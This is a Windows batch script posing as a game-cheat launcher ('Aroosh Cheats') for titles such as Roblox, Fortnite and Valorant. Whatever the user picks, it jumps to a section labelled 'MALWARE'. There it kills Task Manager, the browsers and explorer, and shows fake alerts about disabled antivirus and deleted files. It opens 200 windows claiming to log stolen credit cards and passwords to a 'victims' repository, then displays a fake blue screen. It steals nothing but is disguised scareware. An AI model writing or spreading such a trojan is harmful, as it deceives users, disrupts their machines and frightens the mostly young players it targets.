@echo off
title Aroosh Cheats - Infinite Terminal
color 0A
cls

:: New ASCII Art
echo.
echo.
echo                                                                                                                   
echo        CCCCCCCCCCCCChhhhhhh                                                         tttt                           
echo     CCC::::::::::::Ch:::::h                                                      ttt:::t                           
echo   CC:::::::::::::::Ch:::::h                                                      t:::::t                           
echo  C:::::CCCCCCCC::::Ch:::::h                                                      t:::::t                           
echo C:::::C       CCCCCC h::::h hhhhh           eeeeeeeeeeee    aaaaaaaaaaaaa  ttttttt:::::ttttttt        ssssssssss   
echo C:::::C               h::::hh:::::hhh      ee::::::::::::ee  a::::::::::::a t:::::::::::::::::t      ss::::::::::s  
echo C:::::C               h::::::::::::::hh   e::::::eeeee:::::eeaaaaaaaaa:::::at:::::::::::::::::t    ss:::::::::::::s 
echo C:::::C               h:::::::hhh::::::h e::::::e     e:::::e         a::::atttttt:::::::tttttt    s::::::ssss:::::s
echo C:::::C               h::::::h   h::::::he:::::::eeeee::::::e  aaaaaaa:::::a      t:::::t           s:::::s  ssssss 
echo C:::::C               h:::::h     h:::::he:::::::::::::::::e aa::::::::::::a      t:::::t             s::::::s      
echo C:::::C               h:::::h     h:::::he::::::eeeeeeeeeee a::::aaaa::::::a      t:::::t                s::::::s   
echo  C:::::C       CCCCCC h:::::h     h:::::he:::::::e         a::::a    a:::::a      t:::::t    ttttttssssss   s:::::s 
echo   C:::::CCCCCCCC::::C h:::::h     h:::::he::::::::e        a::::a    a:::::a      t::::::tttt:::::ts:::::ssss::::::s
echo    CC:::::::::::::::C h:::::h     h:::::h  ee:::::::::::::e a::::::::::aa:::a       tt:::::::::::tt s:::::::::::ss  
echo      CCC::::::::::::C h:::::h     h:::::h  eeeeeeeeeeeeee  aaaaaaaaaa  aaaa         ttttttttttt    sssssssssss    
echo.
echo.

:: Menu Options
echo  ----------------------------
echo      Aroosh Cheats Menu
echo  ----------------------------
echo  1) Run Roblox Cheat
echo  2) Run Fortnite Cheat
echo  3) Launch EA FC 24 Cheat
echo  4) Launch GTA V Cheat
echo  5) Launch Call of Duty Cheat
echo  6) Launch Apex Legends Cheat
echo  7) Launch Minecraft Cheat
echo  8) Launch Valorant Cheat
echo  9) Launch Among Us Cheat
echo  10) Launch Game
echo  11) Launch Cheat Menu
echo  12) Exit
echo  ----------------------------
set /p choice=Select an option (1-12): 

:: Regardless of the choice, go to the malware section
goto MALWARE

:MALWARE
cls
title SECURITY BREACH ALERT!
color 4F

:: Maximize terminal window
mode con: cols=200 lines=60

:: Fullscreen using Powershell
powershell -command "$ws = New-Object -ComObject wscript.shell; $ws.SendKeys('{F11}');"

:: Close Task Manager if it's running
taskkill /f /im taskmgr.exe >nul 2>&1

:: Closing common applications quickly
echo Closing common applications...
taskkill /f /im msedge.exe >nul 2>&1
taskkill /f /im chrome.exe >nul 2>&1
taskkill /f /im firefox.exe >nul 2>&1
taskkill /f /im opera.exe >nul 2>&1
taskkill /f /im brave.exe >nul 2>&1
taskkill /f /im notepad.exe >nul 2>&1
taskkill /f /im calc.exe >nul 2>&1
taskkill /f /im mspaint.exe >nul 2>&1
taskkill /f /im explorer.exe >nul 2>&1

:: Anti-close measures
echo [!!!] WARNING: Security Bypass Detected!
timeout /t 1 >nul
echo [!!!] Unauthorized Access Detected! Tracing IP Address...
timeout /t 1 >nul
echo [!!!] SYSTEM ALERT: Firewall Disabled.
timeout /t 1 >nul
echo [!!!] SYSTEM FAILURE: Disabling Antivirus...
timeout /t 1 >nul
echo [!!!] Root Access Gained. Admin Privileges Escalated.
timeout /t 1 >nul
echo [!!!] Deleting critical system files... This may take a moment.
timeout /t 2 >nul

:: Create cascading terminal windows to simulate information access
:OPEN_TERMINALS
:: Generate a large number of terminal windows quickly
for /L %%i in (1,1,200) do (
    set /a randomOption=%random% %% 3
    if !randomOption!==0 (
        set "infoType=Username"
        set "infoValue=*******"
    ) else if !randomOption!==1 (
        set "infoType=Credit Card"
        set /a lastDigit=%random% %% 10
        set "infoValue=**** **** **** !lastDigit!"
    ) else (
        set "infoType=Search History"
        set "infoValue=google.com, facebook.com, twitter.com, darkweb.com"
    )
    
    start cmd /c "color 0C && echo [!!!] Fetching !infoType! information... && timeout /t 1 >nul && echo [!!!] Info found! Info: !infoValue! && echo Logging info to: arooshbd2122.git.repo/victims/!infoType!/storings.json && timeout /t 100 >nul && exit"
)

:: Create ominous pop-ups for SYSTEM COMPROMISED
powershell -command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('SYSTEM COMPROMISED! Your actions are being monitored!', 'Alert', 0, [System.Windows.Forms.MessageBoxIcon]::Warning)"

:: Wait for a moment before simulating BSOD
timeout /t 5 >nul

:: Simulate a BSOD (Blue Screen of Death) effect
cls
echo.
echo                          A critical problem has been detected and Windows has been shut down to prevent irreversible damage
echo                          to your computer.
echo.
echo                          If this is the first time you've seen this Stop error screen,
echo                          restart your computer. If this screen appears again, follow
echo                          these steps:
echo.
echo                          Check to ensure no malicious software is running on your device.
echo                          If this is a new installation, seek assistance from a qualified technician.
echo.
echo                          If problems persist, it may indicate serious hardware failure.
echo                          Contact a professional technician immediately.
echo.
echo                          Technical Information:
echo.
echo                          *** STOP: 0x0000001E (0x00000000, 0x00000000, 0x00000000, 0x00000000)
echo                          *** SYSTEM CRITICAL ERROR. All data may be lost.
echo.
timeout /t 10 >nul
echo Press any key to force shutdown your computer...
pause >nul

:: Loop for continuous popups
goto POPUP_LOOP

pause

shutdown /r